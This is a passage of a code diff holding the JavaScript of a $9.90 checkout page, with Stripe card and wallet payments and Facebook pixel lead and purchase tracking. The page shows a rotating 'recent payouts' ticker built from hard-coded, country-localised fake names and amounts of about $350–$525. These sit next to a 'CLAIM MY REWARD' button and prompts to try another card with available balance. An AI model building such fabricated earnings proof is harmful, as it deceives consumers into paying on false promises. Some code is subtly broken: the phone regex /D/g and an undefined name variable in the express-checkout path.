+          sBtn.innerHTML = 'TRY ANOTHER CARD (WITH AVAILABLE BALANCE) <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:16px;height:16px;"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
+        }
+        return;
+      }
+
+      errBox.textContent = (data && data.error) || defaultMsg || 'Payment failed.';
+    }
+
+    const activePixelIds = ["YOUR_PIXEL_ID_1","YOUR_PIXEL_ID_2"];
+    function initPixels(userData) {
+      if (typeof fbq !== 'function') return;
+      activePixelIds.forEach(function(pId) {
+        if (userData) {
+          fbq('init', pId, userData);
+        } else {
+          fbq('init', pId);
+        }
+      });
+    }
+
+    document.getElementById('flag-emoji').textContent = getFlagEmoji(userCountryCode);
+    document.getElementById('dial-code').textContent = countryDialCodes[userCountryCode] || "+1";
+
+    const stripe = Stripe('pk_live_51UPlGjPMBuGU1s5amTgC1kIPVqMPtF1qtW1anOkO2s6oJSU6UtFubMG7hsrg7XCAXkCbYc5hx93D8Vxfq1H2qOro00hSFatQqq', { locale: userLocale });
+    
+    const elements = stripe.elements({
+      mode: 'payment',
+      amount: 990,
+      currency: 'usd',
+      paymentMethodCreation: 'manual',
+      appearance: {
+        theme: 'night',
+        labels: 'above',
+        variables: {
+          colorPrimary: '#1ed760', colorBackground: '#1a1a1a', colorText: '#ffffff',
+          colorDanger: '#f15e6c', spacingUnit: '4px', borderRadius: '8px',
+          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
+        },
+        rules: {
+          '.Input': { backgroundColor: '#1a1a1a', border: '1px solid #2a2a2a', padding: '12px 14px', boxShadow: 'none' },
+          '.Input:focus': { border: '1px solid #555' },
+          '.Label': { fontWeight: '600', fontSize: '12px', color: '#e0e0e0', marginBottom: '8px', textTransform: 'none' },
+          '.Block': { marginBottom: '16px' }
+        }
+      }
+    });
+    
+    // Ã°Å¸âÂ´ Carteiras (Apple Pay / Google Pay) ficam EXCLUSIVAS no expressCheckoutElement no topo
+    // Desabilitamos wallets do paymentElement para nÃÂ£o aparecer como aba sanfona escondida embaixo do cartÃÂ£o
+    const paymentElement = elements.create('payment', {
+      layout: {
+        type: 'accordion',
+        defaultCollapsed: false,
+        radios: false,
+        spacedAccordionItems: false
+      },
+      wallets: {
+        applePay: 'never',
+        googlePay: 'never'
+      },
+      fields: {
+        billingDetails: { name: 'never', email: 'never', phone: 'never' }
+      }
+    });
+    
+    paymentElement.mount('#payment-element');
+    
+    paymentElement.on('ready', () => {
+      document.getElementById('stripe-skeleton').style.display = 'none';
+      document.getElementById('payment-element').style.display = 'block';
+    });
+
+    paymentElement.on('change', () => {
+      const errBox = document.getElementById('card-errors');
+      if (errBox) errBox.innerHTML = '';
+      const sBtn = document.getElementById('submit-button');
+      if (sBtn) {
+        if (sBtn.innerHTML.includes('PLEASE ENTER ANOTHER CARD') || sBtn.classList.contains('btn-retry-balance')) {
+          sBtn.disabled = false;
+          sBtn.classList.remove('btn-retry-balance');
+          sBtn.innerHTML = btnText;
+        }
+      }
+    });
+    
+    // Ã°Å¸âÂ´ BOTÃÆO EXPRESS CHECKOUT NO TOPO (Apple Pay / Google Pay com 1 clique)
+    const expressCheckoutElement = elements.create('expressCheckout', {
+      buttonTheme: {
+        applePay: 'black',
+        googlePay: 'black'
+      },
+      paymentMethods: {
+        googlePay: 'always',
+        applePay: 'always'
+      },
+      emailRequired: true,
+      phoneNumberRequired: false
+    });
+    
+    expressCheckoutElement.mount('#express-checkout-element');
+
+    expressCheckoutElement.on('ready', ({availablePaymentMethods}) => {
+      if (availablePaymentMethods && (availablePaymentMethods.applePay || availablePaymentMethods.googlePay)) {
+        document.getElementById('express-checkout-divider').style.display = 'flex';
+      }
+    });
+
+    expressCheckoutElement.on('confirm', async (event) => {
+      const { error: submitError } = await elements.submit();
+      if (submitError) {
+        event.complete('fail');
+        errorEl.textContent = submitError.message;
+        return;
+      }
+
+      const billing = event.billingDetails || {};
+      const nameInput = document.getElementById('name').value.trim();
+      const emailInput = document.getElementById('email').value.trim();
+      const rawPhoneInput = document.getElementById('phone').value.trim();
+      const ddi = document.getElementById('dial-code').textContent.trim();
+
+      let resolvedName = '';
+      if (billing.name && billing.name.trim().toLowerCase() !== 'customer') {
+        resolvedName = billing.name.trim();
+      } else if (nameInput && nameInput.toLowerCase() !== 'customer') {
+        resolvedName = nameInput;
+      } else if (urlParams.get('name') && urlParams.get('name').toLowerCase() !== 'customer') {
+        resolvedName = urlParams.get('name').trim();
+      } else if (urlParams.get('nome') && urlParams.get('nome').toLowerCase() !== 'customer') {
+        resolvedName = urlParams.get('nome').trim();
+      }
+
+      const email = billing.email || emailInput || urlParams.get('email') || '';
+      const phone = billing.phone || (rawPhoneInput ? (ddi + ' ' + rawPhoneInput) : (urlParams.get('phone') || ''));
+
+      if (!email) {
+        event.complete('fail');
+        errorEl.textContent = 'Please enter your email to proceed.';
+        return;
+      }
+
+      // Auto-preenche os campos do formulÃÂ¡rio para dar feedback visual imediato
+      if (resolvedName && !document.getElementById('name').value) document.getElementById('name').value = resolvedName;
+      if (email && !document.getElementById('email').value) document.getElementById('email').value = email;
+      if (phone && !document.getElementById('phone').value) document.getElementById('phone').value = phone;
+
+      // CRÃÂTICO: NUNCA enviar 'Customer' como titular do cartÃÂ£o para a Stripe!
+      // Se nÃÂ£o temos o nome real, nÃÂ£o envie name no billing_details para preservar o titular original da carteira/cartÃÂ£o!
+      const billingParams = { email };
+      if (resolvedName) billingParams.name = resolvedName;
+      if (phone) billingParams.phone = phone;
+
+      const { paymentMethod, error } = await stripe.createPaymentMethod({
+        elements,
+        params: {
+          billing_details: billingParams
+        }
+      });
+
+      if (error) {
+        event.complete('fail');
+        errorEl.textContent = error.message;
+        return;
+      }
+
+      try {
+        const res = await fetch('/api/stripe-charge-front' + window.location.search, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            payment_method_id: paymentMethod.id,
+            card_last4: (paymentMethod.card && paymentMethod.card.last4) || '',
+            name: resolvedName,
+            email,
+            phone,
+            extra_params: Object.fromEntries(urlParams.entries())
+          })
+        });
+
+        const data = await res.json();
+
+        if (data.ok && data.requires_action && data.client_secret) {
+          event.complete('success');
+          let resAction = null;
+          try {
+            if (typeof stripe.handleNextAction === 'function') {
+              resAction = await stripe.handleNextAction({ clientSecret: data.client_secret });
+            } else {
+              resAction = await stripe.handleCardAction(data.client_secret);
+            }
+          } catch (e) {
+            resAction = { error: e };
+          }
+          if (resAction && resAction.error) {
+            errorEl.textContent = resAction.error.message || 'Authentication failed.';
+            return;
+          }
+          const confirmRes = await fetch('/api/stripe-confirm-3ds' + window.location.search, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              payment_intent_id: resAction.paymentIntent.id,
+              customer_id: data.customer_id,
+              payment_method_id: paymentMethod.id,
+              name: resolvedName, email, phone,
+              extra_params: Object.fromEntries(urlParams.entries())
+            })
+          });
+          const confirmData = await confirmRes.json();
+          if (confirmData.ok && confirmData.next_url) {
+            if (typeof fbq === 'function') {
+              const firstName = (resolvedName || '').split(' ')[0] || '';
+              const lastName = (resolvedName || '').split(' ').slice(1).join(' ') || '';
+              initPixels({ em: email, ph: phone.replace(/\D/g, ''), fn: firstName, ln: lastName });
+              const finalValue = confirmData.amount ? confirmData.amount / 100 : 990 / 100;
+              const eventId = confirmData.order_id || confirmData.payment_intent_id || ('ord_' + Date.now());
+              fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
+            }
+            setTimeout(() => { window.location.replace(confirmData.next_url); }, 1000);
+            return;
+          } else {
+            errorEl.textContent = confirmData.error || 'Payment confirmation failed.';
+            return;
+          }
+        }
+
+        if (data.ok && data.next_url) {
+          event.complete('success');
+          if (typeof fbq === 'function') {
+            const firstName = name.split(' ')[0] || '';
+            const lastName = name.split(' ').slice(1).join(' ') || '';
+            initPixels({
+              em: email,
+              ph: phone.replace(/\D/g, ''),
+              fn: firstName,
+              ln: lastName
+            });
+            const finalValue = data.amount ? data.amount / 100 : 990 / 100;
+            const eventId = data.order_id || data.payment_intent_id || ('ord_' + Date.now());
+            fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
+          }
+          setTimeout(() => { window.location.replace(data.next_url); }, 1000);
+        } else {
+          event.complete('fail');
+          displayCardError(data, 'Payment failed. Please try another method.');
+        }
+      } catch (err) {
+        event.complete('fail');
+        errorEl.textContent = 'Server connection error. Please try again.';
+      }
+    });
+    
+    // Ã°Å¸âÂ´ DISPARO DE LEAD (Quando o usuÃÂ¡rio termina de preencher os dados)
+    let leadFired = false;
+    const checkAndFireLead = () => {
+      if (leadFired || typeof fbq !== 'function') return;
+      
+      const email = document.getElementById('email').value.trim();
+      const rawPhone = document.getElementById('phone').value.trim();
+      const name = document.getElementById('name').value.trim();
+      
+      // Se preencheu e-mail e telefone vÃÂ¡lidos, dispara Lead (captura de carrinho abandonado)
+      if (email.includes('@') && email.includes('.') && rawPhone.length > 5) {
+        const firstName = name.split(' ')[0] || '';
+        const lastName = name.split(' ').slice(1).join(' ') || '';
+        const ddi = document.getElementById('dial-code').textContent.trim();
+        const ddiDigits = ddi.replace(/D/g, '');
+        const rawDigits = rawPhone.replace(/D/g, '');
+        const fullPhone = rawPhone.startsWith('+') ? rawDigits : (ddiDigits + rawDigits);
+        
+        initPixels({
+          em: email,
+          ph: fullPhone,
+          fn: firstName,
+          ln: lastName
+        });
+        fbq('track', 'Lead');
+        leadFired = true; // Garante que nÃÂ£o dispare vÃÂ¡rias vezes
+      }
+    };
+
+    // Escuta quando o usuÃÂ¡rio sai do campo de telefone ou email
+    document.getElementById('email').addEventListener('blur', checkAndFireLead);
+    document.getElementById('phone').addEventListener('blur', checkAndFireLead);
+    
+    // Ã°Å¸âÂ´ FORMATAÃâ¡ÃÆO INTELIGENTE DE TELEFONE (MÃÂ¡scara DinÃÂ¢mica por RegiÃÂ£o)
+    const phoneInput = document.getElementById('phone');
+    if (phoneInput) {
+      phoneInput.addEventListener('input', function(e) {
+        const ddi = (document.getElementById('dial-code').textContent || '').trim();
+        e.target.value = formatPhoneDisplay(e.target.value, ddi);
+      });
+    }
+
+    // Ã°Å¸âÂ´ PROVA SOCIAL INTELIGENTE: Geolocalizada por PaÃÂ­s com Prioridade nos Top 10
+    const countryPayouts = {
+      CA: [
+        { name: 'Liam M.', amount: '$438.77', method: 'Direct Deposit', time: '2m ago' },
+        { name: 'Chloe B.', amount: '$412.50', method: 'Interac e-Transfer', time: '4m ago' },
+        { name: 'Noah T.', amount: '$518.40', method: 'Direct Deposit', time: '7m ago' },
+        { name: 'Emma C.', amount: '$389.20', method: 'PayPal', time: '11m ago' }
+      ],
+      NZ: [
+        { name: 'Jack W.', amount: '$426.10', method: 'Direct Deposit', time: '2m ago' },
+        { name: 'Hana K.', amount: '$485.30', method: 'Instant Transfer', time: '5m ago' },
+        { name: 'Oliver S.', amount: '$394.00', method: 'PayPal', time: '8m ago' },
+        { name: 'Aroha M.', amount: '$452.80', method: 'Direct Deposit', time: '12m ago' }
+      ],
+      PH: [
+        { name: 'Mark D.', amount: '$378.90', method: 'GCash / Bank', time: '2m ago' },
+        { name: 'Princess A.', amount: '$440.60', method: 'PayPal', time: '4m ago' },
+        { name: 'Angelo R.', amount: '$362.40', method: 'Instant Transfer', time: '6m ago' },
+        { name: 'Maria C.', amount: '$415.50', method: 'Bank Transfer', time: '9m ago' }
+      ],
+      ZA: [
+        { name: 'Thabo N.', amount: '$352.80', method: 'EFT Instant', time: '2m ago' },
+        { name: 'Sipho M.', amount: '$440.60', method: 'Capitec Pay', time: '5m ago' },
+        { name: 'Kagiso D.', amount: '$418.00', method: 'PayPal', time: '8m ago' },
+        { name: 'Lindiwe S.', amount: '$465.10', method: 'Bank Transfer', time: '11m ago' }
+      ],
+      US: [
+        { name: 'Sarah M.', amount: '$438.77', method: 'Direct Deposit', time: '2m ago' },
+        { name: 'Michael B.', amount: '$389.20', method: 'PayPal', time: '4m ago' },
+        { name: 'Olivia W.', amount: '$518.45', method: 'Instant Transfer', time: '7m ago' },
+        { name: 'Ethan H.', amount: '$495.00', method: 'Direct Deposit', time: '10m ago' }
+      ],
+      ZM: [
+        { name: 'Blessing K.', amount: '$368.50', method: 'Mobile Money', time: '3m ago' },
+        { name: 'Chileshe M.', amount: '$418.00', method: 'PayPal', time: '6m ago' },
+        { name: 'Mwamba B.', amount: '$395.20', method: 'Instant Transfer', time: '9m ago' }
+      ],
+      IE: [
+        { name: 'Conor O.', amount: '$426.30', method: 'SEPA Direct', time: '2m ago' },
+        { name: 'Siobhan K.', amount: '$472.80', method: 'Revolut / Card', time: '5m ago' },
+        { name: 'Aoife M.', amount: '$385.00', method: 'Instant Transfer', time: '8m ago' }
+      ],
+      AU: [
+        { name: 'Harper T.', amount: '$507.30', method: 'PayID Instant', time: '3m ago' },
+        { name: 'Jack P.', amount: '$431.90', method: 'Direct Deposit', time: '6m ago' },
+        { name: 'Ruby N.', amount: '$398.50', method: 'PayPal', time: '9m ago' }
+      ],
+      SE: [
+        { name: 'Astrid L.', amount: '$525.00', method: 'Swish / Bank', time: '3m ago' },
+        { name: 'Johan E.', amount: '$445.60', method: 'Instant Transfer', time: '7m ago' }
+      ],
+      TH: [
+        { name: 'Somchai P.', amount: '$378.00', method: 'PromptPay', time: '4m ago' },
+        { name: 'Kanya S.', amount: '$412.50', method: 'Bank Transfer', time: '8m ago' }
+      ]
+    };
+
+    const globalPool = [
+      { name: 'Sarah M.', amount: '$438.77', method: 'Direct Deposit', time: '2m ago' },
+      { name: 'Liam C.', amount: '$412.50', method: 'PayPal', time: '4m ago' },
+      { name: 'Mark D.', amount: '$389.20', method: 'Instant Transfer', time: '6m ago' },
+      { name: 'Chloe B.', amount: '$465.10', method: 'Direct Deposit', time: '8m ago' },
+      { name: 'Olivia W.', amount: '$518.45', method: 'Instant Transfer', time: '11m ago' },
+      { name: 'Conor O.', amount: '$426.30', method: 'Direct Deposit', time: '13m ago' },
+      { name: 'Thabo N.', amount: '$352.80', method: 'PayPal', time: '15m ago' },
+      { name: 'Emma R.', amount: '$394.15', method: 'PayPal', time: '18m ago' }
+    ];
+
+    const localList = countryPayouts[userCountryCode] || [];
+    // Prioriza os nomes locais do paÃÂ­s do lead + intercala com a lista global
+    const recentPayouts = localList.length > 0
+      ? [...localList, ...globalPool.filter(g => !localList.some(l => l.name === g.name))]
+      : globalPool;
+
+    let payoutIdx = Math.floor(Math.random() * recentPayouts.length);
+    const tickerWrapper = document.getElementById('payout-text-wrapper');
+    if (tickerWrapper) {
+      // Inicia imediatamente com um item do pool selecionado
+      const initialItem = recentPayouts[payoutIdx];
+      const userEl0 = document.getElementById('payout-user');
+      const valEl0 = document.getElementById('payout-val');
+      const methodEl0 = document.getElementById('payout-method');
+      const timeEl0 = document.getElementById('payout-time');
+      if (userEl0) userEl0.textContent = initialItem.name;
+      if (valEl0) valEl0.textContent = initialItem.amount;
+      if (methodEl0) methodEl0.textContent = initialItem.method;
+      if (timeEl0) timeEl0.textContent = '(' + initialItem.time + ')';
+
+      setInterval(() => {
+        payoutIdx = (payoutIdx + 1) % recentPayouts.length;
+        tickerWrapper.style.opacity = '0';
+        setTimeout(() => {
+          const item = recentPayouts[payoutIdx];
+          const userEl = document.getElementById('payout-user');
+          const valEl = document.getElementById('payout-val');
+          const methodEl = document.getElementById('payout-method');
+          const timeEl = document.getElementById('payout-time');
+          if (userEl) userEl.textContent = item.name;
+          if (valEl) valEl.textContent = item.amount;
+          if (methodEl) methodEl.textContent = item.method;
+          if (timeEl) timeEl.textContent = '(' + item.time + ')';
+          tickerWrapper.style.opacity = '1';
+        }, 350);
+      }, 4500);
+    }
+    
+    const form = document.getElementById('payment-form');
+    const submitBtn = document.getElementById('submit-button');
+    const errorEl = document.getElementById('card-errors');
+    const btnText = 'CLAIM MY REWARD <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>';
+    // urlParams jÃÂ¡ instanciado no topo do script
+    
+    // Ã°Å¸âÂ´ CHECAGEM DE RETORNO DO 3DS (Se o banco exigiu redirecionamento completo de pÃÂ¡gina)
+    const redirectStatus = urlParams.get('redirect_status');
+    const paymentIntentIdFromRedirect = urlParams.get('payment_intent');
+    
+    if ((redirectStatus === 'succeeded' || redirectStatus === 'requires_confirmation' || redirectStatus === 'pending') && paymentIntentIdFromRedirect) {
+      document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#070a08;color:#fff;font-family:sans-serif;text-align:center;padding:20px;">' +
+        '<div style="width:50px;height:50px;border:3px solid #1ed760;border-top-color:transparent;border-radius:50%;margin-bottom:20px;"></div>' +
+        '<h2 style="font-size:24px;margin-bottom:10px;">Payment Verified!</h2>' +
+        '<p style="color:#a0a0a0;">Finalizing your access and redirecting...</p>' +
+      '</div>';
+
+      fetch('/api/stripe-confirm-3ds' + window.location.search, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          payment_intent_id: paymentIntentIdFromRedirect,
+          customer_id: urlParams.get('customer_id') || urlParams.get('cid'),
+          payment_method_id: urlParams.get('payment_method_id') || urlParams.get('pm'),
+          name: urlParams.get('name') || urlParams.get('nome') || '',
+          email: urlParams.get('email') || '',
+          phone: urlParams.get('phone') || '',
+          extra_params: Object.fromEntries(urlParams.entries())
+        })
+      })
+      .then(res => res.json())
+      .then(confirmData => {
+        if (confirmData.ok && confirmData.next_url) {
+          if (typeof fbq === 'function') {
+            const finalValue = confirmData.amount ? confirmData.amount / 100 : 990 / 100;
+            const eventId = confirmData.order_id || confirmData.payment_intent_id || ('ord_' + Date.now());
+            fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
+          }
+          setTimeout(() => { window.location.replace(confirmData.next_url); }, 1000);
+        } else {
+          const cleanSearch = window.location.search.replace(/[?&](payment_intent|payment_intent_client_secret|redirect_status)=[^&]*/g, '');
+          document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#070a08;color:#fff;font-family:sans-serif;text-align:center;padding:20px;">' +
+            '<div style="width:50px;height:50px;border-radius:50%;background:#e53e3e;display:flex;align-items:center;justify-content:center;font-size:24px;margin-bottom:20px;">Ã¢Åâ¢</div>' +
+            '<h2 style="font-size:22px;margin-bottom:10px;">Payment Not Completed</h2>' +
+            '<p style="color:#a0a0a0;max-width:400px;margin-bottom:20px;">' + (confirmData.error || 'Your bank authentication was not completed. Please try another card.') + '</p>' +
+            '<a href="/' + cleanSearch + '" style="background:#1ed760;color:#000;text-decoration:none;padding:12px 24px;border-radius:24px;font-weight:bold;">TRY AGAIN</a>' +
+          '</div>';
+        }
+      })
+      .catch((err) => {
+        const cleanSearch = window.location.search.replace(/[?&](payment_intent|payment_intent_client_secret|redirect_status)=[^&]*/g, '');
+        document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#070a08;color:#fff;font-family:sans-serif;text-align:center;padding:20px;">' +
+          '<div style="width:50px;height:50px;border-radius:50%;background:#e53e3e;display:flex;align-items:center;justify-content:center;font-size:24px;margin-bottom:20px;">Ã¢Åâ¢</div>' +
+          '<h2 style="font-size:22px;margin-bottom:10px;">Connection Error</h2>' +
+          '<p style="color:#a0a0a0;max-width:400px;margin-bottom:20px;">Unable to verify payment status. Please check your card statement or try again.</p>' +
+          '<a href="/' + cleanSearch + '" style="background:#1ed760;color:#000;text-decoration:none;padding:12px 24px;border-radius:24px;font-weight:bold;">TRY AGAIN</a>' +
+        '</div>';
+      });
+    }
+    
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      submitBtn.disabled = true; submitBtn.innerHTML = 'PROCESSING...'; errorEl.innerHTML = '';
+      
+      const name = document.getElementById('name').value.trim() || urlParams.get('name') || urlParams.get('nome') || '';
+      const email = document.getElementById('email').value.trim();
+      const phone = getCleanE164Phone();
+      const billingParams = { email };
+      if (phone) billingParams.phone = phone;
+      if (name && name.toLowerCase() !== 'customer') billingParams.name = name;
+
+      let pmResult = await stripe.createPaymentMethod({
+        type: 'card',
+        card: cardElement,
+        params: {
+          billing_details: billingParams
+        }
+      });
+
+      // Se a Stripe rejeitar o formato do telefone, tenta novamente sem o telefone para nunca travar a compra
+      if (pmResult.error && (pmResult.error.param === 'phone' || String(pmResult.error.message).toLowerCase().includes('phone'))) {
+        delete billingParams.phone;
+        pmResult = await stripe.createPaymentMethod({
+          type: 'card',
+          card: cardElement,
+          params: {
+            billing_details: billingParams
+          }
+        });
+      }
+
+      const { paymentMethod, error } = pmResult;
+      
+      if (error) {
+        errorEl.textContent = error.message;
+        submitBtn.disabled = false; submitBtn.innerHTML = btnText; return;
+      }
+      
+      const pmCard = paymentMethod && paymentMethod.card;
+      const cardBrand = pmCard ? pmCard.brand : '';
+      const cardLast4 = pmCard ? pmCard.last4 : '';
+      const expMonth = pmCard ? pmCard.exp_month : '';
+      const expYear = pmCard ? pmCard.exp_year : '';
+      const cardKey = (cardBrand && cardLast4) ? (cardBrand + '_' + cardLast4 + '_' + expMonth + '_' + expYear) : '';
+
+      if (sessionStorage.getItem('checkout_session_locked') === 'true') {
+        displayCardError({
+          session_locked: true,
+          error: 'Too many payment attempts. Please wait 5 minutes before trying again or use a different card.'
+        });
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = 'TOO MANY ATTEMPTS';
+        return;
+      }
+
+      if (cardKey && (localStorage.getItem('blocked_card_' + cardKey) || sessionStorage.getItem('blocked_card_' + cardKey))) {
+        displayCardError({
+          block_card: true,
+          error: 'Your bank has declined this card twice previously. To avoid further bank blocks, please enter a different card.'
+        });
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = 'PLEASE ENTER ANOTHER CARD';
+        return;
+      }
+
+      try {
+        const res = await fetch('/api/stripe-charge-front' + window.location.search, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            payment_method_id: paymentMethod.id,
+            card_last4: cardLast4,
+            name, email, phone,
+            extra_params: Object.fromEntries(urlParams.entries())
+          })
+        });
+        
+        const data = await res.json();
+
+        if (data.block_card && cardKey) {
+          try {
+            localStorage.setItem('blocked_card_' + cardKey, 'true');
+            sessionStorage.setItem('blocked_card_' + cardKey, 'true');
+          } catch (e) {}
+        }
+
+        if (data.session_locked) {
+          try {
+            sessionStorage.setItem('checkout_session_locked', 'true');
+          } catch (e) {}
+        }
+        
+        // Ã°Å¸âÂ´ NOVO: Se o banco exigir autenticaÃÂ§ÃÂ£o 3DS (SMS, App do Banco, etc.)
+        if (data.ok && data.requires_action && data.client_secret) {
+          submitBtn.innerHTML = 'VERIFYING WITH YOUR BANK...';
+          const actionNotice = document.getElementById('card-action-notice');
+          if (actionNotice) actionNotice.style.display = 'block';
+          let confirmedIntent = null;
+          let actionError = null;
+
+          try {
+            if (typeof stripe.handleNextAction === 'function') {
+              const resAction = await stripe.handleNextAction({ clientSecret: data.client_secret });
+              confirmedIntent = resAction.paymentIntent;
+              actionError = resAction.error;
+            } else {
+              const resAction = await stripe.handleCardAction(data.client_secret);
+              confirmedIntent = resAction.paymentIntent;
+              actionError = resAction.error;
+            }
+          } catch (e) {
+            actionError = e;
+          }
+
+          if (actionError) {
+            if (actionNotice) actionNotice.style.display = 'none';
+            let actionFails = 0;
+            if (cardKey) {
+              try {
+                actionFails = parseInt(sessionStorage.getItem('action_fails_' + cardKey) || '0', 10) + 1;
+                sessionStorage.setItem('action_fails_' + cardKey, actionFails.toString());
+                if (actionFails >= 3) {
+                  localStorage.setItem('blocked_card_' + cardKey, 'true');
+                  sessionStorage.setItem('blocked_card_' + cardKey, 'true');
+                }
+              } catch (e) {}
+            }
+            errorEl.textContent = actionError.message || 'Authentication could not be completed. Please try again or use another card.';
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = btnText;
+            return;
+          }
+
+          if (confirmedIntent && (confirmedIntent.status === 'succeeded' || confirmedIntent.status === 'requires_capture' || confirmedIntent.status === 'requires_confirmation' || confirmedIntent.status === 'processing')) {
+            submitBtn.innerHTML = 'FINALIZING ACCESS...';
+            if (actionNotice) {
+              actionNotice.innerHTML = '<div class="verification-header"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg><span>Verification Approved!</span></div><div class="verification-desc">Finalizing your access...</div>';
+            }
+            const confirmRes = await fetch('/api/stripe-confirm-3ds' + window.location.search, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                payment_intent_id: confirmedIntent.id,
+                customer_id: data.customer_id,
+                payment_method_id: paymentMethod.id,
+                name, email, phone,
+                extra_params: Object.fromEntries(urlParams.entries())
+              })
+            });
+            const confirmData = await confirmRes.json();
+            if (confirmData.ok && confirmData.next_url) {
+              if (typeof fbq === 'function') {
+                const firstName = name.split(' ')[0] || '';
+                const lastName = name.split(' ').slice(1).join(' ') || '';
+                initPixels({
+                  em: email,
+                  ph: phone.replace(/\D/g, ''),
+                  fn: firstName,
+                  ln: lastName
+                });
+                const finalValue = confirmData.amount ? confirmData.amount / 100 : 990 / 100;
+                const eventId = confirmData.order_id || confirmData.payment_intent_id || ('ord_' + Date.now());
+                fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
+              }
+              setTimeout(() => { window.location.replace(confirmData.next_url); }, 1500);
+              return;
+            } else {
+              if (actionNotice) actionNotice.style.display = 'none';
+              if (confirmData.block_card && cardKey) {
+                try {
+                  localStorage.setItem('blocked_card_' + cardKey, 'true');
+                  sessionStorage.setItem('blocked_card_' + cardKey, 'true');
+                } catch (e) {}
+              }
+              errorEl.textContent = confirmData.error || 'Payment confirmation failed. Please try another card.';
+              submitBtn.disabled = false;
+              submitBtn.innerHTML = btnText;
+              return;
+            }
+          } else {
+            if (actionNotice) actionNotice.style.display = 'none';
+            errorEl.textContent = 'Payment incomplete. Please try another card.';
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = btnText;
+            return;
+          }
+        }
+        
+        if (data.ok && data.next_url) {
+          // Ã°Å¸âÂ´ INTEGRAÃâ¡ÃÆO DO FACEBOOK ADVANCED MATCHING FRONTEND PARA PURCHASE
+          if (typeof fbq === 'function') {
+            const firstName = name.split(' ')[0] || '';
+            const lastName = name.split(' ').slice(1).join(' ') || '';
+            
+            initPixels({
+              em: email,
+              ph: phone.replace(/\D/g, ''),
+              fn: firstName,
+              ln: lastName
+            });
+            const finalValue = data.amount ? data.amount / 100 : 990 / 100;
+            const eventId = data.order_id || data.payment_intent_id || ('ord_' + Date.now());
+            fbq('track', 'Purchase', { value: finalValue, currency: 'USD' }, { eventID: eventId });
+          }
+          setTimeout(() => { window.location.replace(data.next_url); }, 1500);
+        } else {
+          displayCardError(data, 'Payment failed.');
+          if (!data.block_card && !data.session_locked) {
+            submitBtn.disabled = false; submitBtn.innerHTML = btnText;
+          }
+        }
+      } catch (err) {
+        errorEl.textContent = 'Server connection error.';
+        submitBtn.disabled = false; submitBtn.innerHTML = btnText;
+      }
+    });
+  </script>
+</body>
+</html>
